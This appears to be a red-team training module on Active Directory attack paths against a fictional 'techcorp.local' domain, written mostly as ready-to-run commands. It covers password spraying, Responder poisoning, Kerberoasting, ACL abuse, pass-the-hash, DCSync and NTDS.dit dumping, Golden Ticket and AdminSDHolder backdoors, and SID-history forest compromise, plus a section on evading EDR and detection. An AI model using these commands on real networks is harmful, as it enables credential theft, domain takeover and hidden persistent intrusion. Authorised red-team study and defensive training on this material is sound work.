# 05 — AD Attack Paths & RTO Methodology

> **Module:** Active Directory
> **Difficulty:** Intermediate-Advanced
> **RTO Relevance:** Critical — This is how real Red Team engagements unfold

---

## The Red Team Mindset

A Penetration Tester asks: *"What vulnerabilities exist?"*

A Red Team Operator asks: *"How do I achieve the objective without being detected?"*

Every technique in this repository feeds into a **structured attack chain**. This document ties everything together.

---

## The Complete AD Attack Chain

```
┌─────────────────────────────────────────────┐
│           PHASE 1: INITIAL ACCESS           │
│  Phishing / Web Exploit / Password Spray    │
└──────────────────────┬──────────────────────┘
                       ↓
┌─────────────────────────────────────────────┐
│         PHASE 2: INTERNAL RECON             │
│  BloodHound / PowerView / LDAP Queries      │
└──────────────────────┬──────────────────────┘
                       ↓
┌─────────────────────────────────────────────┐
│       PHASE 3: PRIVILEGE ESCALATION         │
│  Kerberoasting / ACL Abuse / AS-REP Roast   │
└──────────────────────┬──────────────────────┘
                       ↓
┌─────────────────────────────────────────────┐
│         PHASE 4: LATERAL MOVEMENT           │
│  Pass-the-Hash / PsExec / WMI / RDP         │
└──────────────────────┬──────────────────────┘
                       ↓
┌─────────────────────────────────────────────┐
│        PHASE 5: DOMAIN COMPROMISE           │
│  DCSync / NTDS.dit Dump / Domain Admin      │
└──────────────────────┬──────────────────────┘
                       ↓
┌─────────────────────────────────────────────┐
│           PHASE 6: PERSISTENCE              │
│  Golden Ticket / AdminSDHolder / Backdoors  │
└──────────────────────┬──────────────────────┘
                       ↓
┌─────────────────────────────────────────────┐
│        PHASE 7: FOREST COMPROMISE           │
│  Trust Attacks / SID History / Enterprise   │
└─────────────────────────────────────────────┘
```

---

## Phase 1 — Initial Access

Getting that first foothold inside the network:

### Password Spraying
```bash
# Try ONE common password against MANY accounts
# (avoids account lockout — one attempt per account)
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Welcome2024!' --continue-on-success

# Why it works:
# Large companies have thousands of users
# Statistically, several will have weak/default passwords
```

### LLMNR/NBT-NS Poisoning (Passive Entry)
```bash
# Start Responder — capture hashes from network mistakes
sudo responder -I eth0 -wrf

# When any PC makes a name resolution mistake:
# → Their NTLMv2 hash lands in your terminal
# → Crack or relay it for initial access
```

---

## Phase 2 — Internal Recon

You are inside. Now map the environment silently:

### BloodHound Data Collection
```powershell
# Run SharpHound on compromised machine
.\SharpHound.exe -c All --zipfilename bloodhound_data.zip

# Transfer zip to attacker machine
# Import into BloodHound GUI
# Run: "Shortest Path to Domain Admin"
```

### LDAP Enumeration
```bash
# From Kali — map the domain
ldapsearch -H ldap://192.168.1.5 \
  -D "ali.hassan@techcorp.local" -w "Password123" \
  -b "dc=techcorp,dc=local" "(objectClass=user)" \
  sAMAccountName description memberOf pwdLastSet

# Find Kerberoastable accounts
ldapsearch -H ldap://192.168.1.5 \
  -D "ali.hassan@techcorp.local" -w "Password123" \
  -b "dc=techcorp,dc=local" \
  "(&(objectClass=user)(servicePrincipalName=*))"
```

### PowerView Recon
```powershell
# Who has local admin access where?
Find-LocalAdminAccess -Verbose

# Where are Domain Admins logged in right now?
Find-DomainUserLocation -GroupName "Domain Admins"

# What ACL misconfigs exist?
Find-InterestingDomainAcl -ResolveGUIDs
```

---

## Phase 3 — Privilege Escalation

Move from low user to something with more power:

### Path A — Kerberoasting
```bash
# 1. Find service accounts with SPNs
GetUserSPNs.py techcorp.local/ali.hassan:Password123 -dc-ip 192.168.1.5

# 2. Request and save tickets
GetUserSPNs.py techcorp.local/ali.hassan:Password123 \
  -dc-ip 192.168.1.5 -request -outputfile kerberoast.hash

# 3. Crack offline
hashcat -m 13100 kerberoast.hash rockyou.txt --force

# Result: svc.database plaintext password → often has local admin rights
```

### Path B — AS-REP Roasting
```bash
# Find accounts with pre-auth disabled
GetNPUsers.py techcorp.local/ -usersfile domain_users.txt \
  -dc-ip 192.168.1.5 -format hashcat -outputfile asrep.hash

# Crack
hashcat -m 18200 asrep.hash rockyou.txt
```

### Path C — ACL Abuse
```powershell
# BloodHound shows ali.hassan has GenericWrite on svc.backup
# svc.backup is member of Backup Operators

# Step 1: Set SPN on svc.backup (make it Kerberoastable)
Set-DomainObject -Identity svc.backup \
  -Set @{serviceprincipalname='fake/service.techcorp.local'}

# Step 2: Kerberoast svc.backup
# Step 3: Crack → get svc.backup password
# Step 4: svc.backup is Backup Operator → can dump NTDS.dit
```

---

## Phase 4 — Lateral Movement

Move from one machine to another to reach better-positioned accounts:

### Pass-the-Hash
```bash
# Use captured hash to access other machines
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c \
  ali.hassan@192.168.1.20

# crackmapexec for network-wide hash spraying
crackmapexec smb 192.168.1.0/24 \
  -u ali.hassan -H 8846f7eaee8fb117ad06bdd830b7586c
```

### WMI Execution (Stealthy)
```bash
# Execute commands remotely via WMI (Windows Management Instrumentation)
# WMI traffic looks like normal admin activity
impacket-wmiexec techcorp.local/ali.hassan:Password123@192.168.1.20
```

### SMB with Admin Shares
```bash
# If you have admin credentials/hash
impacket-smbexec techcorp.local/domain.admin:Password123@192.168.1.5
```

---

## Phase 5 — Domain Compromise

You have Domain Admin — now extract everything:

### DCSync — The Preferred Method
```bash
# Pull all hashes remotely (no file on disk)
impacket-secretsdump -just-dc techcorp.local/domain.admin:Password123@192.168.1.5

# Or target specific account
impacket-secretsdump -just-dc-user krbtgt \
  techcorp.local/domain.admin:Password123@192.168.1.5
```

### VSS + NTDS.dit (If Remote Methods Blocked)
```powershell
# On DC:
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\

# Transfer to Kali and extract:
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

---

## Phase 6 — Persistence

Maintain access even if defenders reset passwords:

### Golden Ticket
```bash
# Create eternal access ticket using KRBTGT hash
# Valid for 10 years — survives password resets
mimikatz: kerberos::golden /user:BackdoorAdmin \
  /domain:techcorp.local \
  /sid:S-1-5-21-3623811015-3361044348-30300820 \
  /krbtgt:49aab0eabb8f9e04d0c9fc8a34e42b96 \
  /endin:87600 /renewmax:700000 /ptt
```

### AdminSDHolder Backdoor
```powershell
# Add your user to AdminSDHolder with GenericAll
# SDProp runs every 60 minutes and copies these permissions
# to all protected groups (Domain Admins, etc.)

Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=techcorp,DC=local' \
  -PrincipalIdentity ali.hassan \
  -Rights All

# After 60 minutes:
# ali.hassan has GenericAll on Domain Admins
# Even if removed from DA group — still has full control
```

---

## Phase 7 — Forest Compromise

From child domain to full forest control:

### SID History Attack
```bash
# From child domain DC (already compromised):
# Get Enterprise Admins SID from parent domain
Get-DomainGroup -Identity "Enterprise Admins" -Domain techcorp.local | select objectsid

# Create inter-realm Golden Ticket with Enterprise Admin SID in SIDHistory
mimikatz: kerberos::golden /user:Administrator \
  /domain:asia.techcorp.local \
  /sid:S-1-5-21-CHILD-DOMAIN-SID \
  /sids:S-1-5-21-PARENT-DOMAIN-SID-519 \
  /krbtgt:CHILD-KRBTGT-HASH \
  /ptt

# /sids: = SID History injection
# 519 = Enterprise Admins RID
# Result: Access to parent domain as Enterprise Admin
```

---

## RTO Mindset — Detection Avoidance

### What Gets You Caught
```
❌ Running Nmap scans inside the network (huge noise)
❌ Using standard Metasploit payloads (signature detected)
❌ Dumping LSASS with Mimikatz directly (EDR catches this)
❌ Lateral movement to many machines too fast
❌ Creating new admin accounts (triggers alerts)
```

### What Keeps You Hidden
```
✅ Living off the Land (LotL) — use Windows built-in tools
✅ BloodHound for surgical targeting (minimum noise)
✅ DCSync instead of file-based NTDS.dit extraction
✅ Slow and deliberate lateral movement
✅ Blend in with normal admin traffic patterns
✅ Use trusted binaries: wmic, net, powershell, certutil
```

### LotL (Living off the Land) Examples
```powershell
# Instead of Nmap — use Windows built-in
arp -a                          # See ARP table
net view /domain:techcorp       # List domain computers
net group "Domain Admins" /domain # List DA members
nltest /dclist:techcorp.local   # List DCs
nslookup -type=SRV _ldap._tcp.techcorp.local  # Find DC via DNS
```

---

## Quick Reference — Attack Decision Tree

```
Got initial access (low user)
        │
        ├── Run BloodHound
        │       │
        │       ├── Direct path to DA? → Follow it
        │       │
        │       └── No direct path?
        │               │
        │               ├── Kerberoastable accounts? → Kerberoast
        │               ├── AS-REP Roastable? → AS-REP Roast
        │               ├── ACL misconfigs? → ACL Abuse
        │               └── Local admin somewhere? → Lateral move
        │
        ├── Find DA session on a machine
        │       │
        │       └── Local admin on that machine?
        │               │
        │               └── Yes → Dump LSASS → Get DA hash
        │
        └── Get Domain Admin
                │
                ├── DCSync → Get all hashes
                ├── Golden Ticket → Persistent access
                └── AdminSDHolder → Long-term backdoor
```

---

## Key Takeaways

- AD attacks follow a structured kill chain — each phase feeds the next
- Recon comes before every action — BloodHound first, attack second
- Kerberoasting and ACL abuse are the most common real-world escalation paths
- DCSync is the stealthiest domain compromise technique
- Persistence through Golden Ticket and AdminSDHolder survives most defensive responses
- SID History attack bridges child domains to forest-level control
- **Detection avoidance > speed** — slow and quiet beats fast and noisy every time
- Living off the Land (LotL) = use Windows tools to blend in with normal activity

---


> *"The best attack is the one that was never detected."*
